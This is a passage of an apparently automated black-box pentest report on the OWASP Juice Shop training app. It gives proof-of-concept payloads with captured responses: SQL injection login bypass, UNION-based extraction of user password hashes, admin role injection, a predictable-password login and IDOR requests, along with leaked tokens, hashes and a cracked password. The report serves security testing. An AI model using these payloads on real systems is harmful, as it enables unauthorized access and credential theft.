# OWASP Juice Shop Black-Box Reference Report

## Report Context
Black-box benchmark run. Runtime findings are backed by observable target behavior and evidence artifacts.

This Markdown example is formatted for GitHub rendering. Browser screenshots are stored as relative assets under `docs/examples/assets/`.

## Executive Summary
Assessment completed for 192.168.1.221. Discovered 4 open ports and 4 service fingerprints. Validated findings: 32. CVE references: 20.

## Scope
- Run ID: `4b60de46-6ffb-44d3-92f7-5a55d1375e4a`
- Mode: `pentest`
- Target: `192.168.1.221`
- Objective: Full pentest of 192.168.1.221

## Attack Surface
- Open TCP ports: 111, 22, 3001, 9100
- Services: jetdirect, nessus, rpcbind, ssh
- CVE references observed: CVE-1999-0213, CVE-1999-0461, CVE-1999-1061, CVE-1999-1062, CVE-2000-0525, CVE-2000-0999, CVE-2001-0144, CVE-2002-0083, CVE-2002-0639, CVE-2002-1048, CVE-2005-3670, CVE-2007-0358, CVE-2009-2753, CVE-2009-2754, CVE-2010-4070, CVE-2016-9259, CVE-2017-6543, CVE-2017-7199, CVE-2018-1147, CVE-2018-1148

## Findings Summary
- Critical: 4
- High: 19
- Medium: 9
- Low: 0
- Informational: 0

## Technical Findings
### 1. SQL injection authentication bypass: POST /rest/user/login
- Severity: CRITICAL
- Status: validated
- Confidence: 0.93
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authentication accepted a SQL tautology payload and returned an authenticated-looking response.

**Proof Of Concept**
POST http://192.168.1.221:3001/rest/user/login with JSON email/username payload `' OR 1=1--` and any password.

**Evidence**
`POST http://192.168.1.221:3001/rest/user/login` with a SQL tautology returned HTTP 200 and authentication markers.

**Remediation**
Use parameterized queries or ORM-safe predicates for authentication and add negative tests for SQL metacharacters.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-login-sqli-auth-bypass.txt

```text
URL: http://192.168.1.221:3001/rest/user/login
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 799
ETag: W/"31f-AaRzH960xVmMxjZDzygOLs58500"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Request JSON:
{
  "email": "' OR 1=1--",
  "username": "' OR 1=1--",
  "password": "anything"
}

Body Snippet:
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjAgMTU6NTY6MTkuOTI0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjAgMTU6NTY6MTkuOTI0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NjkxMTQ5M30.s43n8jvvsWdGBZ0BW3mwfgdArAGT20hSVzijVByXFNtv3pff95J7DFUFd4mE3gzi0ceCI0tGUtBVQ_pNS1ePcx6zy5rU5oAELUuypCt4S30ao-fzCHveMnMGU6MKODAk2FS-NXAjBOM4Hv1Dl5UFMAqxpatrSJGaou29ouA68cU","bid":1,"umail":"admin@juice-sh.op"}}
```

### 2. Admin role injection during registration
- Severity: CRITICAL
- Status: validated
- Confidence: 0.92
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Registration accepted a client-supplied admin role value.

**Proof Of Concept**
POST registration payload including `"role":"admin"` and observe successful privileged account creation.

**Evidence**
`POST http://192.168.1.221:3001/api/Users` reflected/admin-confirmed elevated role assignment.

**Remediation**
Ignore client-supplied role fields and assign default least-privilege roles server-side only.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-Users-role-admin.txt

```text
URL: http://192.168.1.221:3001/api/Users
Status: 201
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Location: /api/Users/49
Content-Type: application/json; charset=utf-8
Content-Length: 335
ETag: W/"14f-J1fBIP6j6yJrAr9wMReAjQUhEmo"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{
  "email": "vantix-admin-1776911494411@example.invalid",
  "password": "Vantix!12345",
  "passwordRepeat": "Vantix!12345",
  "role": "admin",
  "securityQuestion": {
    "id": 1,
    "question": "Your eldest siblings middle name?",
    "createdAt": "2024-01-01",
    "updatedAt": "2024-01-01"
  },
  "securityAnswer": "test"
}

Body Snippet:
{"status":"success","data":{"username":"","deluxeToken":"","lastLoginIp":"0.0.0.0","profileImage":"/assets/public/images/uploads/defaultAdmin.png","isActive":true,"id":49,"email":"vantix-admin-1776911494411@example.invalid","role":"admin","updatedAt":"2026-04-23T02:31:34.740Z","createdAt":"2026-04-23T02:31:34.740Z","deletedAt":null}}
```

### 3. SQL injection data extraction signal: GET /rest/products/search
- Severity: CRITICAL
- Status: validated
- Confidence: 0.92
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: UNION-style input returned user credential/role fields, indicating data-exfiltration-capable SQL injection.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--

**Evidence**
`GET http://192.168.1.221:3001/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--` returned user/email/password-hash markers.

**Remediation**
Use strict parameter binding, reject unsafe query fragments, and remove SQL error/data leakage from responses.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-products-search-sqli-union-data-extract.txt

```text
URL: http://192.168.1.221:3001/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 888
ETag: W/"378-U3ZDY8kXBF30Iu76cwdYDm/UnaI"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:33 GMT
Connection: close

Body Snippet:
{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"admin","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":2,"name":"jim@juice-sh.op","description":"e541ca7ecf72b8d1286474fc613e5e45","price":"customer","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":3,"name":"bender@juice-sh.op","description":"0c36e517e3fa95aabf1bbffc6744a4ef","price":"customer","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":4,"name":"bjoern.kimminich@gmail.com","description":"6edd9d726cbdc873c539e41ae8757b8c","price":"admin","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0},{"id":5,"name":"ciso@juice-sh.op","description":"861917d5fa5f1172f931dc700d81a8fb","price":"deluxe","deluxePrice":0,"image":0,"createdAt":0,"updatedAt":0,"deletedAt":0}]}
```

### 4. Predictable nOAuth password acceptance signal
- Severity: CRITICAL
- Status: validated
- Confidence: 0.88
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: An OAuth-style account accepted a deterministic reversed-email base64 password pattern.

**Proof Of Concept**
Generate `base64(reverse(email))` and authenticate against login endpoint.

**Evidence**
Generated password accepted for `bjoern.kimminich@gmail.com`.

**Remediation**
Never derive OAuth local credentials from deterministic user attributes; enforce strong random secrets and secure OAuth linkage.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-login-noauth-predictable-password.txt

```text
URL: http://192.168.1.221:3001/rest/user/login
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 833
ETag: W/"341-XMp+HL/kvIOKAWX6Ex0ueGLciD4"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:33 GMT
Connection: close

Request JSON:
{
  "email": "bjoern.kimminich@gmail.com",
  "password": "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="
}

Body Snippet:
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NCwidXNlcm5hbWUiOiJia2ltbWluaWNoIiwiZW1haWwiOiJiam9lcm4ua2ltbWluaWNoQGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiNmVkZDlkNzI2Y2JkYzg3M2M1MzllNDFhZTg3NTdiOGMiLCJyb2xlIjoiYWRtaW4iLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA0LTIwIDE1OjU2OjE5LjkyNSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA0LTIwIDE1OjU2OjE5LjkyNSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE3NzY5MTE0OTN9.DpAwxT2zK3uMRmIZItZBukjULYoHCwIdcy5ITzmXFxWlxSXnXp3X42IbhOlLuo_tM-6N8waPEgozrEQqNyFeYbhQJYmWgL9bezxKwpPTJbK9asGqWh-fBXWfP7M8w68KSNUVdA2vTaEXNddbGQXe36NOIG4JS1LdWyiOmupcmHc","bid":7,"umail":"bjoern.kimminich@gmail.com"}}
```

### 5. Authenticated API response exposes password hash field
- Severity: HIGH
- Status: validated
- Confidence: 0.91
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Profile endpoint returned password hash material to an authenticated client session.

**Proof Of Concept**
Authenticate, request whoami with explicit fields including password, and inspect response JSON.

**Evidence**
`GET http://192.168.1.221:3001/rest/user/whoami?fields=id,email,role,deluxeToken,password` exposed hash data.

**Remediation**
Never serialize password/passwordHash fields in API responses; enforce strict DTO allowlists.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-whoami-password-hash-leak.txt

```text
URL: http://192.168.1.221:3001/rest/user/whoami?fields=id,email,role,deluxeToken,password
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 123
ETag: W/"7b-3TzHqGiShM3/IaPRp7QrukC0ENc"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Body Snippet:
{"user":{"id":1,"email":"admin@juice-sh.op","role":"admin","deluxeToken":"","password":"0192023a7bbd73250516f069df18b500"}}
```

### 6. Exposed hardcoded client credentials in static bundle
- Severity: HIGH
- Status: validated
- Confidence: 0.90
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Static client bundle exposed plaintext credentials usable against the authentication endpoint.

**Proof Of Concept**
Fetch client JavaScript bundles, extract exposed credentials, then authenticate via `/rest/user/login`.

**Evidence**
`GET http://192.168.1.221:3001/main.js` disclosed embedded credentials.

**Remediation**
Remove credentials from client-side code, rotate exposed secrets, and enforce build-time secret scanning.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/client-bundle-hardcoded-credentials.txt

```text
URL: http://192.168.1.221:3001/main.js
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:50:11 GMT
ETag: W/"14cdab-19d8ac134b8"
Content-Type: application/javascript; charset=UTF-8
Content-Length: 1363371
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
import{a as Am}from"./chunk-24EZLZ4I.js";import{a as Bm,b as Um,c as N0,d as A6,f as jm,g as OS}from"./chunk-T3PSKZ45.js";import{$ as bm,$a as L1,$b as Qt,A as zS,Aa as M6,Ab as wr,B as b1,Ba as Bi,Bb as J,C as mm,Ca as AS,Cb as z6,D as hm,Da as Pn,Db as mt,E as Ii,Ea as W1,Eb as u2,F as pm,Fa as Sm,Fb as Vn,G as X1,Ga as ga,Gb as _a,H as x0,Ha as km,Hb as ke,I as TS,Ia as DS,Ib as ea,J as C1,Ja as T0,Jb as g2,K as _r,Ka as Pt,Kb as Qa,L as A2,La as fi,Lb as e1,M as M0,Ma as zm,Mb as ba,N as fm,Na as Zo,Nb as Sr,O as um,Oa as Tm,Ob as Vm,P as Qo,Pa as w6,Pb as D0,Q as w0,Qa as S6,Qb as I0,R as gm,Ra as xi,Rb as kr,S as vm,Sa as ze,Sb as L0,T as Ga,Ta as y1,Tb as Mi,U as ES,Ua as Ce,Ub as zr,V as s1,Va as ge,Vb as at,W as Y2,Wa as ve,Wb as zt,X as b6,Xa as va,Xb as We,Y as n1,Ya as E0,Yb as Om,Z as _m,Za as k6,Zb as IS,_ as S0,_a as xr,_b as ht,a as ue,aa as k0,ab as K2,ac as f1,b as Nt,ba as Z2,bb as E1,bc as P0,c as Zd,ca as C6,cb as I2,cc as v2,d as It,da as Yo,db as l1,dc as T6,e as Se,ea as Cm,eb as Em,ec as V0,f as K,fa as An,fb as ui,fc as Ze,g as Y,ga as br,gb as Wa,gc as E6,h as W,ha as y6,hb as le,hc as Qe,i as $1,ia as Dn,ib as oe,ic as LS,j as y0,ja as h2,jb as ne,jc as Je,k as yt,ka as $2,kb as pe,kc as Hm,l as m2,la as Xi,lb as X2,lc as PS,m as om,ma as z0,mb as p2,mc as O0,n as p1,na as D2,nb as Dm,nc as Nm,o as Lt,oa as qt,ob as Im,oc as Rm,p as K1,pa as ym,pb as A0,pc as VS,q as ja,qa as Cr,qb as de,qc as nt,r as pa,ra as Li,rb as he,rc as $e,s as cm,sa as In,sb as J2,sc as et,t as sm,ta as xm,tb as Lm,tc as H0,u as Ki,ua as Mm,ub as Mr,uc as Fm,v as fa,va as Ln,vb as Vt,w as En,wa as wm,wb as J1,x as lm,xa as yr,xb as f2,y as dm,ya as ua,yb as Pm,z as qa,za as x6,zb as gt}from"./chunk-4MIYPPGW.js";import{$ as Ut,$b as m,$c as vr,A as Kt,Aa as He,Ab as c,B as $t,Ba as kt,Bb as s,Cb as u,D as j,Da as ae,Db as Gt,Dc as Qd,Ea as E2,Eb as Jt,Ec as Ee,F as Tn,Fb as Zi,Fc as ur,Gb as _e,Gc as Yd,H as j1,Ha as v6,Hb as be,Hc as Z,I as g6,Ib as _1,Ic as ot,J as Ad,Jb as L,K as Dd,Kb as Ai,L as Id,La as tt,Lb as S,M as Ld,Ma as wt,Mb as qd,Mc as k,Na as _6,Nb as v,Ob as Re,Pa as Nd,Pb as me,Qa as l,Qb as Be,Qc as $d,Ra as Rd,Rb as te,Sa as N,Sb as F,Sc as gr,Ta as re,Tb as B,U as Pd,Ua as m1,Uc as T1,V as i1,Va as h1,Vc as Ba,W as q1,Wa as Fd,Wc as $i,X as xt,Xa as v1,Xb as se,Xc as _0,Y as Vd,Ya as it,Yb as _t,Yc as b0,Z as hr,Za as u0,Zb as ie,Zc as Kd,_ as Xt,_a as G1,_b as Dt,_c as C0,a as o1,ac as A,ad as Ua,ba as hi,bc as E,bd as Xd,c as ma,ca as $,cb as D,cc as O1,cd as Jd,da as ye,db as xe,dc as Fa,dd as Di,eb as X,ec as Ni,f as we,fa as ce,fb as g0,fc as Ri,g as d2,ga as Ei,gb as Fe,gc as Fi,gd as a1,h as Sd,ha as h,hb as Bd,hc as Ve,hd as em,i as f6,ia as Od,ib as R,ic as W2,id as kS,j as Hi,jb as pr,jc as Gd,jd as tm,k as kd,kc as Ie,kd as im,l as c1,la as z,lc as St,ld as Ae,ma as T,mc as bt,md as am,n as zd,na as Mt,nc as z1,nd as nm,oa as yi,oc as v0,od as rm,p as kn,pa as st,pb as Ra,pc as b,pd as Wt,q,qa as jt,qb as G,qc as C,r as Ha,rb as Ud,rc as dt,rd as Z1,s as u6,sb as M,sc as Q2,sd as ha,tb as jd,ua as Hd,ub as w,uc as Wd,v as mr,va as ft,vb as fr,w as zn,wb as Ft,x as Na,xa as lt,xb as qe,y as Td,ya as p0,yb as Ge,yc as pi,z as Ed,za as f0,zb as f}from"./chunk-LHKS7QUN.js";import{a as Xe,b as U1,d as wd,e as x,f as Te,h as dr,j as Pe}from"./chunk-TWZW5B45.js";function Xo(t){return typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?Xo=function(n){return typeof n}:Xo=function(n){return n&&typeof Symbol=="function"&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Xo(t)}function HS(t,n){if(!(t instanceof n))throw new TypeError("Cannot call a class as a function")}function qm(t,n){for(var e=0;e<n.length;e++){var i=n[e];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function NS(t,n,e){return n&&qm(t.prototype,n),e&&qm(t,e),t}function RS(t,n,e){return n in t?Object.defineProperty(t,n,{value:e,enumerable:!0,configurable:!0,writable:!0}):t[n]=e,t}function Ot(t){for(var n=1;n<arguments.length;n++){var e=arguments[n]!=null?arguments[n]:{},i=Object.keys(e);typeof Object.getOwnPropertySymbols=="function"&&(i=i.concat(Object.getOwnPropertySymbols(e).filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),i.forEach(function(a){RS(t,a,e[a])})}return t}function j6(t,n){return BS(t)||jS(t,n)||GS()}function q6(t){return FS(t)||US(t)||qS()}function FS(t){if(Array.isArray(t)){for(var n=0,e=new Array(t.length);n<t.length;n++)e[n]=t[n];return e}}function BS(t){if(Array.isArray(t))return t}function US(t){if(Symbol.iterator in Object(t)||Object.prototype.toString.call(t)==="[object Arguments]")return Array.from(t)}function jS(t,n){var e=[],i=!0,a=!1,r=void 0;try{for(var o=t[Symbol.iterator](),d;!(i=(d=o.next()).done)&&(e.push(d.value),!(n&&e.length===n));i=!0);}catch(p){a=!0,r=p}finally{try{!i&&o.return!=null&&o.return()}finally{if(a)throw r}}return e}function qS(){throw new TypeError("Invalid attempt to spread non-iterable instance")}function GS(){throw new TypeError("Invalid attempt to destructure non-iterable instance")}function rk(t){var n=H1.querySelector("script["+t+"]");if(n)return n.getAttribute(t)}function ok(t){return t===""?!0:t==="false"?!1:t==="true"?!0:t}function lk(t){Ma&&(B0?setTimeout(t,0):v9.push(t))}function hk(){for(var t=0;t<$o.length;t++)$o[t][0]($o[t][1]);$o=[],H6=!1}function q0(t,n){$o.push([t,n]),H6||(H6=!0,mk(hk,0))}function pk(t,n){function e(a){Q6(n,a)}function i(a){Jo(n,a)}try{t(e,i)}catch(a){i(a)}}function C9(t){var n=t.owner,e=n._state,i=n._data,a=t[e],r=t.then;if(typeof a=="function"){e=U0;try{i=a(i)}catch(o){Jo(r,o)}}y9(r,i)||(e===U0&&Q6(r,i),e===j0&&Jo(r,i))}function y9(t,n){var e;try{if(t===n)throw new TypeError("A promises callback cannot return that same promise.");if(n&&(typeof n=="function"||Xo(n)==="object")){var i=n.then;if(typeof i=="function")return i.call(n,function(a){e||(e=!0,n===a?x9(t,a):Q6(t,a))},function(a){e||(e=!0,Jo(t,a))
```

### 7. Weak MD5 password hash cracking signal
- Severity: HIGH
- Status: validated
- Confidence: 0.89
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Leaked password hash was crackable with a short common-password dictionary.

**Proof Of Concept**
Hash common candidate passwords with MD5 and compare against leaked value.

**Evidence**
Leaked hash matched dictionary candidate `admin123`.

**Remediation**
Use adaptive password hashing (Argon2id/bcrypt/scrypt) with per-user salts and secret pepper controls.

### 8. Deluxe membership workflow bypass signal
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: state-mutation, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; single canary mutation where required
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Deluxe membership upgrade endpoint accepted a direct request from a regular user without explicit payment proof.

**Proof Of Concept**
Register/login as regular user, then POST an empty JSON body to `/rest/deluxe-membership`.

**Evidence**
`POST http://192.168.1.221:3001/rest/deluxe-membership` returned upgrade markers for a regular account.

**Remediation**
Enforce server-side payment and entitlement verification before role or membership upgrades.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-deluxe-membership.txt

```text
URL: http://192.168.1.221:3001/rest/deluxe-membership
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 943
ETag: W/"3af-FeQeXOSxBBD0P3lbdYedpmV2quY"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Request JSON:
{}

Body Snippet:
{"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NDgsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ2YW50aXgtdXNlci0xNzc2OTExNDk0NDExQGV4YW1wbGUuaW52YWxpZCIsInBhc3N3b3JkIjoiNzdlZjJmMDAwZDA3NGMzNmQxZmRkM2VkNDBjOThiYjAiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJhNTljOTYyNWRmMTViOGE4YzUyY2RhNTI3MTlmZDJkNjdiNzljNWYwYzZlNmFkOGVhNmMwZDI3YjJjZjlmNmI1IiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjNUMDI6MzE6MzQuNDIxWiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjNUMDI6MzE6MzQuNzAxWiIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NjkxMTQ5NX0.puqFE4-uatXCHG_iclmBQwsGMWjGnm2PB2Xb0pFfPFm-b_dof4jIr_RBObSbFsiKgRsM1ecqntw702rsBL0wp2Jiiil96_Ospri_vQb0Z-iiAEAJidny5zdEMJKBU2y349ZknR1EIUJSzDNsJzE_1_hZ6VvoQH8Danwik9KiMp8"}}
```

### 9. IDOR signal: GET /api/Feedbacks/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent, credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; harmless marker payload only; capture proof material in run artifacts
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://192.168.1.221:3001/api/Feedbacks/1 with a non-owner bearer token.

**Evidence**
`GET http://192.168.1.221:3001/api/Feedbacks/1` returned HTTP 200 with object data markers.

**Remediation**
Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-Feedbacks-1-idor.txt

```text
URL: http://192.168.1.221:3001/api/Feedbacks/1
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 229
ETag: W/"e5-AS8Pvb0dlujEHfSmA+b+u55zdY0"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)","rating":5,"createdAt":"2026-04-20T15:56:20.068Z","updatedAt":"2026-04-20T15:56:20.068Z"}}
```

### 10. IDOR signal: GET /api/Users/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://192.168.1.221:3001/api/Users/2 with a non-owner bearer token.

**Evidence**
`GET http://192.168.1.221:3001/api/Users/2` returned HTTP 200 with object data markers.

**Remediation**
Enforce object-level authorization on every user-scoped resource read and write path.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/api-Users-2-idor.txt

```text
URL: http://192.168.1.221:3001/api/Users/2
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Content-Length: 297
ETag: W/"129-iiGa2nJRTb2gT3G2q7cl8SqXVzI"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:33 GMT
Connection: close

Body Snippet:
{"status":"success","data":{"id":2,"username":"","email":"jim@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-04-20T15:56:19.924Z","updatedAt":"2026-04-20T15:56:19.924Z","deletedAt":null}}
```

### 11. IDOR signal: GET /rest/basket/:id
- Severity: HIGH
- Status: validated
- Confidence: 0.86
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Authenticated request returned cross-object data without visible ownership checks.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/basket/1 with a non-owner bearer token.

**Evidence**
`GET http://192.168.1.221:3001/rest/basket/1` returned HTTP 200 with object data markers.

**Remediation**
